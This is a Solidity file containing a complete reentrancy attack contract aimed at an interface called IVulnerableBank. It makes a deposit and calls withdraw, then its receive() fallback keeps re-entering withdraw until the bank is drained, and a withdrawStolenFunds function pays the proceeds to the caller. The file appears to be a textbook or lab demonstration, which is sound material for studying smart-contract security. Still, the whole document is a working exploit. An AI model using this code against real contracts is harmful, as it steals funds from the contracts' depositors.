// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    uint256 public amountToWithdraw;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    function attack(uint256 initialDeposit) external payable {
        require(msg.value == initialDeposit, "Incorrect initial deposit");

        // Deposit some ether first
        bank.deposit{value: initialDeposit}();

        // Set the amount to withdraw (use the entire balance to maximize attack)
        amountToWithdraw = initialDeposit;

        // Start the attack by withdrawing
        bank.withdraw(amountToWithdraw);
    }

    // Fallback function that gets called when receiving ether
    receive() external payable {
        // Re-enter the vulnerable contract - keep withdrawing our recorded balance
        // The vulnerability allows us to withdraw multiple times before our balance is updated
        // Stop when the bank doesn't have enough funds for another withdrawal
        if (address(bank).balance >= amountToWithdraw) {
            bank.withdraw(amountToWithdraw);
        }
    }

    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
